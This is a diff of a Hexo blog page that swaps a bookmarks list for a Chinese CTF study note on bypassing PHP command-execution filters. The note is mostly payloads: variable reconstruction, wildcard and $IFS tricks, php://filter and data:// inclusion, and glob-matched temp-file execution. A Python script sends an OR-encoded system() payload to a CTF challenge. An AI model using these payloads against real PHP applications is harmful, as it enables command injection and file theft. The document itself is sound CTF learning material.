@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Link, Robin">
-    <meta name="description" content="Welcome">
+    <meta name="keywords" content="命令执行, Robin">
+    <meta name="description" content="命令执行首先看过滤了什么东西，再按照下面的方法一点一点绕过。再利用没过滤的字符构造playload很多是可以泛用的，如果能找到一个很好用的也不错。
+前置知识
+&amp;lt;?=`ls /`;?&amp;gt;等效于&amp;lt;?php echo `ls /`">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,8 +19,8 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Link | Robin</title>
-    <link rel="icon" type="image/png" href="../favicon.png">
+    <title>命令执行 | Robin</title>
+    <link rel="icon" type="image/png" href="../../../../favicon.png">
     
     <style>
         body{
@@ -35,29 +37,29 @@
 
 
 
-<link rel="stylesheet" type="text/css" href="../libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="../libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="../libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="../libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="../libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="../css/matery.css">
-<link rel="stylesheet" type="text/css" href="../css/my.css">
-<link rel="stylesheet" type="text/css" href="../css/dark.css" media="none" onload="if(media!='all')media='all'">
+<link rel="stylesheet" type="text/css" href="../../../../libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="../../../../libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="../../../../libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="../../../../libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="../../../../libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="../../../../css/matery.css">
+<link rel="stylesheet" type="text/css" href="../../../../css/my.css">
+<link rel="stylesheet" type="text/css" href="../../../../css/dark.css" media="none" onload="if(media!='all')media='all'">
 
 
 
 
-    <link rel="stylesheet" href="../css/post.css">
+    <link rel="stylesheet" href="../../../../css/post.css">
 
 
 
     
-        <link rel="stylesheet" type="text/css" href="../css/reward.css">
+        <link rel="stylesheet" type="text/css" href="../../../../css/reward.css">
     
 
 
 
-    <script src="../libs/jquery/jquery-3.6.0.min.js"></script>
+    <script src="../../../../libs/jquery/jquery-3.6.0.min.js"></script>
 
 <!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="atom.xml" title="Robin" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
@@ -69,9 +71,9 @@
     <nav id="headNav" class="bg-color nav-transparent">
         <div id="navContainer" class="nav-wrapper container">
             <div class="brand-logo">
-                <a href="../index.html" class="waves-effect waves-light">
+                <a href="../../../../index.html" class="waves-effect waves-light">
                     
-                    <img src="../medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="../../../../medias/logo.png" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">Robin</span>
                 </a>
@@ -83,7 +85,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../index.html" class="waves-effect waves-light">
+    <a href="../../../../index.html" class="waves-effect waves-light">
       
       <i class="fas fa-home" style="zoom: 0.6;"></i>
       
@@ -94,7 +96,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../tags" class="waves-effect waves-light">
+    <a href="../../../../tags" class="waves-effect waves-light">
       
       <i class="fas fa-tags" style="zoom: 0.6;"></i>
       
@@ -105,7 +107,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../categories" class="waves-effect waves-light">
+    <a href="../../../../categories" class="waves-effect waves-light">
       
       <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
       
@@ -116,7 +118,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../archives" class="waves-effect waves-light">
+    <a href="../../../../archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
@@ -127,7 +129,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../about" class="waves-effect waves-light">
+    <a href="../../../../about" class="waves-effect waves-light">
       
       <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
       
@@ -138,7 +140,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../comments" class="waves-effect waves-light">
+    <a href="../../../../comments" class="waves-effect waves-light">
       
       <i class="fas fa-envelope" style="zoom: 0.6;"></i>
       
@@ -149,7 +151,7 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="../link" class="waves-effect waves-light">
+    <a href="../../../../link" class="waves-effect waves-light">
       
       <i class="fas fa-link" style="zoom: 0.6;"></i>
       
@@ -175,7 +177,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="../medias/logo.png" class="logo-img circle responsive-img">
+        <img src="../../../../medias/logo.png" class="logo-img circle responsive-img">
         
         <div class="logo-name">Robin</div>
         <div class="logo-desc">
@@ -189,7 +191,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../index.html" class="waves-effect waves-light">
+		<a href="../../../../index.html" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-home"></i>
 			
@@ -200,7 +202,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../tags" class="waves-effect waves-light">
+		<a href="../../../../tags" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-tags"></i>
 			
@@ -211,7 +213,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../categories" class="waves-effect waves-light">
+		<a href="../../../../categories" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-bookmark"></i>
 			
@@ -222,7 +224,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../archives" class="waves-effect waves-light">
+		<a href="../../../../archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
@@ -233,7 +235,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../about" class="waves-effect waves-light">
+		<a href="../../../../about" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-user-circle"></i>
 			
@@ -244,7 +246,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../comments" class="waves-effect waves-light">
+		<a href="../../../../comments" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-envelope"></i>
 			
@@ -255,7 +257,7 @@
         
         <li class="m-nav-item">
 	  
-		<a href="../link" class="waves-effect waves-light">
+		<a href="../../../../link" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-link"></i>
 			
@@ -343,12 +345,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('../medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Link</h1>
+                    <h1 class="description center-align post-title">命令执行</h1>
                 </div>
             </div>
         </div>
@@ -368,12 +370,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
+                                <span class="chip bg-color">日报</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
+                                日报
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -382,28 +397,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-10-05
+                    2023-04-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-04
+                    2023-04-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    93
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -423,8 +438,210 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="这里是我滴百宝箱"><a href="#这里是我滴百宝箱" class="headerlink" title="这里是我滴百宝箱"></a>这里是我滴百宝箱</h5><h3 id="网站名——网址"><a href="#网站名——网址" class="headerlink" title="网站名——网址"></a>网站名——网址</h3><p>1.<a href="https://axutongxue.gitee.io/">储物间</a><br>2.<a href="https://ps.gaoding.com/#/">在线PS</a><br>3.<a href="https://www.cnblogs.com/">博客园</a><br>4.<a href="https://sourceforge.net/">软件下载站</a><br>5.<a href="https://www.52pojie.cn/">吾爱破解</a><br>6.<a href="https://www.learnfk.com/">学习平台</a><br>7.<a href="https://www.csdn.net/?spm=1001.2100.3001.4476">CSDN</a><br>8.<a href="http://toolwa.com/github/">GitHub下载工具</a><br>9.<a href="http://toolwa.com/github/">图片源</a><br>10.<a href="http://pan.maplelcg.top/">maplelcg的blog</a><br>11.<a href="https://cassellcollege.com/%e6%ac%a2%e8%bf%8e%e8%bf%9b%e5%85%a5%e5%8d%a1%e5%a1%9e%e5%b0%94%e5%ad%a6%e9%99%a2%e7%bd%91%e7%ab%99/">卡塞尔学院</a><br>12.<a href="https://mp.weixin.qq.com/s/Bf7uVhGiu47uOELjmC5uXQ">Git笔记教程</a><br>13.<a href="https://616.sb/">616.sb</a><br>14.<a href="https://jiemahao.com/">接码平台</a><br>15.<a href="https://redive.estertion.win/arcaea/probe/">Ak查分器</a><br>16.<a href="https://www.iculture.cc/">猪站</a><br>17.<a href="https://bilibili.iiilab.com/?iao.su">哔哩视频解析</a><br>18.<a href="daisu.ke">浴霸不能</a></p>
-<h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3>
+                <h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p>
+<p>前置知识</p>
+<pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;
+
+?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的php
+
+php文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方
+</code></pre>
+<p>各种绕过手法</p>
+<pre><code>【过滤变量名】
+重构变量
+?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;
+匹配符绕过
+?c=echo `cat fl&#39;&#39;ag.php`;
+?c=echo `cat fl/ag.txt`;
+?c=echo `cat fl*`;
+
+【过滤system】
+system()
+assert()
+passthru()
+exec()           //只执行无回显
+shell_exec()     // 只执行无回显
+popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );
+proc_open()      //不会直接返回执行结果，而是返回一个文件指针
+pcntl_exec()
+call_user_func()
+还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt
+
+【过滤cat】
+more:一页一页的显示档案内容
+less:与 more 类似
+head:查看头几行
+tac:从最后一行开始显示，是 cat 的反向显示
+tail:查看尾几行
+nl：显示的时候，顺便输出行号
+od:以二进制的方式读取档案内容
+vi:一种编辑器，这个也可以查看
+vim:一种编辑器，这个也可以查看
+sort:可以查看
+uniq:可以查看
+file -f:报错出具体内容
+sh /flag 2&gt;%261  //报错出文件内容
+strings:可以查看
+rev:反过来看
+新增一个xxd可以读取文件
+curl file:///flag 也行
+bash -v:/etc/passwd
+date -f:好像可以越权读取文件
+/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat
+
+【过滤空格】
+%09
+%20
+$IFS
+$&#123;IFS&#125;
+$IFS$9
+$IFS$1
+&lt;
+&lt;&gt;
+顺便提一句，%09表示的是制表符，而不是空格
+因为浏览器会自动对特殊字符进行编码
+所以使用%09表示制表符也是可以被浏览器正确识别的
+
+【过滤;】
+使用?&gt;替换，因为最后一句不用分号
+
+include，也就是说应该传入一个文件名
+include的文件中出错了但是主程序会继续往下执行
+
+【过滤括号】
+使用不用括号的函数(伪协议)
+?c=php://filter/read=convert.base64-encode/resource=flag.php
+伪协议也可以重构变量
+?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php
+?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt
+
+【PHP伪协议】
+file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+
+【文件按包含漏洞】
+使用data://协议执行PHP代码
+?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码
+?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志
+此处让网页直接包含我们写入的代码，从而执行恶意命令
+但是仍然要绕过对flag的过滤
+
+【常用套娃函数】
+get_defined_vars() 返回一个包含所有已定义变量列表的多维数组
+array_pop() 是删除并返回数组最后一个元素
+current() 返回数组中的当前元素的值。别名是pos()
+next() 返回数组中的下一个元素的值。
+end()最后一个
+scandir() 函数返回指定目录中的文件和目录的数组。
+print_r() 函数用于打印变量，以更容易理解的形式展示。
+localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）
+current() 函数返回数组中的当前元素的值。别名是pos()
+array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。
+read_file()  读出源码
+highlight_file()  读出源码
+show_source()  读出源码
+
+【套娃例子】
+           要使用POST传参
+?c=eval(array_pop(next(get_defined_vars())));
+cmd=system(“cat flag.php”);
+           不使用POST传参时
+?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+           在COOKIE处传马
+/?c=show_source(session_id(session_start()));
+再把PHPSSID值设为flag.php
+
+【重定向绕过】
+system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+       &gt;/dev/null表示将命令的标准输出重定向到/dev/null文件中
+       2&gt;&amp;1表示将命令的错误输出也重定向到/dev/null
+       因此不会输出到终端或文件中
+使用;  &amp;&amp;  %0a  ||等等绕过即可
+但是要注意所用的PHP版本会影响效果，多试试。
+
+【无字母数字的命令执行】
+/bin/base64以base64加密输出文件
+所以payload: /?c=/???/????64 ????.???
+    或者
+/usr/bin/bzip2将文件压缩为文件名.bz2然后访问
+payload: /?c=/???/???/????2 ????.???
+</code></pre>
+<p>文件上传形式的命令执行</p>
+<pre><code>原理是通过POST上传一个文件，文件内容是要执行的命令
+使用点命令执行该文件时形成条件竞争
+这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径
+[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）
+之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。
+就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。
+
+POST的参数为
+?c=.%20/???/????????[@-[]
+
+上传下面的内容可以达到命令执行的效果
+#!  /bin/bash
+ls
+</code></pre>
+<p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p>
+<pre class="line-numbers language-Python"><code class="language-Python">import re
+import urllib
+import requests
+from urllib import parse
+#
+# hex_i = ""
+# hex_j = ""
+# pattern='/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&|\-/i'
+# str1=["system","cat flag.php"]
+# for p in range(2):
+#     t1 = ""
+#     t2 = ""
+#     for k in str1[p]:
+#         for i in range(256):
+#             for j in range(256):
+#                 if re.search(pattern,chr(i)) :
+#                     break
+#                 if re.search(pattern,chr(j)) :
+#                     continue
+#                 if i < 16:
+#                     hex_i = "0" + hex(i)[2:]
+#                 else:
+#                     hex_i=hex(i)[2:]
+#                 if j < 16:
+#                     hex_j="0"+hex(j)[2:]
+#                 else:
+#                     hex_j=hex(j)[2:]
+#                 hex_i='%'+hex_i
+#                 hex_j='%'+hex_j
+#                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))
+#                 if(c ==k):
+#                     t1=t1+hex_i
+#                     t2=t2+hex_j
+#                     break
+#             else:
+#                 continue
+#             break
+#     payload = "(\""+t1+"\"|\""+t2+"\")"
+#     print(payload)
+
+payload='("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%03%01%14%00%06%0c%01%07%00%10%08%10"|"%60%60%60%20%60%60%60%60%2e%60%60%60")'
+print(payload)
+data=&#123;
+    "c":urllib.parse.unquote(payload)
+&#125;
+url="http://9fdf5bf0-5dfe-4203-ae04-41501a9f6768.challenge.ctf.show/"
+re=requests.post(url,data=data)
+print(re.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
                 
             </div>
             <hr/>
@@ -437,17 +654,21 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
+                                    <span class="chip bg-color">日报</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
                 <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="../libs/share/css/share.min.css">
+                    <link rel="stylesheet" type="text/css" href="../../../../libs/share/css/share.min.css">
 <div id="article-share">
 
     
     <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="../libs/share/js/social-share.min.js"></script>
+    <script src="../../../../libs/share/js/social-share.min.js"></script>
     
 
     
@@ -472,10 +693,10 @@
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
-                        <img src="../medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                        <img src="../../../../medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                     </div>
                 </div>
             </div>
@@ -523,9 +744,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="../medias/featureimages/2.jpg" class="responsive-img" alt="Link">
+                        <img src="../../../../medias/featureimages/4.jpg" class="responsive-img" alt="命令执行">
                         
-                        <span class="card-title">Link</span>
+                        <span class="card-title">命令执行</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -536,17 +757,29 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-08
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            liuGuobin
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
+                                    日报
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
+                        <span class="chip bg-color">日报</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -554,16 +787,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="">
+                <a href="../../07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
                     <div class="card-image">
                         
                         
-                        <img src="../medias/featureimages/2.jpg" class="responsive-img" alt="Link">
+                        <img src="../../../../medias/featureimages/16.jpg" class="responsive-img" alt="CTFshow刷题记录">
                         
-                        <span class="card-title">Link</span>
+                        <span class="card-title">CTFshow刷题记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -574,17 +807,28 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-07
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            liuGuobin
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
+                                    日报
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/%E6%97%A5%E6%8A%A5/">
+                        <span class="chip bg-color">日报</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -634,42 +878,42 @@
 
 
 <!-- 代码块功能依赖 -->
-<script type="text/javascript" src="../libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeBlockFuction.js"></script>
 
 
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeLang.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeShrink.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeShrink.js"></script>
 
 
 
 <!-- 代码块功能依赖 -->
-<script type="text/javascript" src="../libs/codeBlock/codeBlockFunction.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeBlockFunction.js"></script>
 
 <!-- 代码语言 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeLang.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeLang.js"></script>
 
 
 <!-- 代码块复制 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeCopy.js"></script>
 
 
 <!-- 代码块收缩 -->
 
-<script type="text/javascript" src="../libs/codeBlock/codeShrink.js"></script>
+<script type="text/javascript" src="../../../../libs/codeBlock/codeShrink.js"></script>
 
 
 <!-- 代码块折行 -->
@@ -696,7 +940,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             
                 <span id="year">2020-2023</span>
             
-            <a href="../about" target="_blank">liuGuobin</a>
+            <a href="../../../../about" target="_blank">liuGuobin</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -754,7 +998,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
 
 
-    <a href="../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+    <a href="../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
         <i class="fas fa-rss"></i>
     </a>
 
@@ -865,7 +1109,7 @@ $(function () {
         });
     };
 
-    searchFunc('../search.xml', 'searchInput', 'searchResult');
+    searchFunc('../../../../search.xml', 'searchInput', 'searchResult');
 });
 </script>
 
@@ -901,12 +1145,12 @@ $(function () {
 </div>
 
 
-    <script src="../libs/materialize/materialize.min.js"></script>
-    <script src="../libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="../libs/aos/aos.js"></script>
-    <script src="../libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="../libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="../js/matery.js"></script>
+    <script src="../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../libs/aos/aos.js"></script>
+    <script src="../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../js/matery.js"></script>
 
     
 
@@ -916,7 +1160,7 @@ $(function () {
             // 只在桌面版网页启用特效
             var windowWidth = $(window).width();
             if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="../libs/others/sakura-half.js"><\/script>');
+                document.write('<script type="text/javascript" src="../../../../libs/others/sakura-half.js"><\/script>');
             }
         </script>
     
@@ -942,10 +1186,10 @@ $(function () {
     <!-- Baidu Push -->
 
     
-    <script src="../libs/others/clicklove.js" async="async"></script>
+    <script src="../../../../libs/others/clicklove.js" async="async"></script>
     
     
-    <script async src="../libs/others/busuanzi.pure.mini.js"></script>
+    <script async src="../../../../libs/others/busuanzi.pure.mini.js"></script>
     
 
     
@@ -959,15 +1203,15 @@ $(function () {
     
     
     <script type="text/javascript" size="150" alpha='0.6'
-        zIndex="-1" src="../libs/background/ribbon-refresh.min.js" async="async"></script>
+        zIndex="-1" src="../../../../libs/background/ribbon-refresh.min.js" async="async"></script>
     
 
     
-    <script type="text/javascript" src="../libs/background/ribbon-dynamic.js" async="async"></script>
+    <script type="text/javascript" src="../../../../libs/background/ribbon-dynamic.js" async="async"></script>
     
 
     
-    <script src="../libs/instantpage/instantpage.js" type="module"></script>
+    <script src="../../../../libs/instantpage/instantpage.js" type="module"></script>
     
 
 <!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
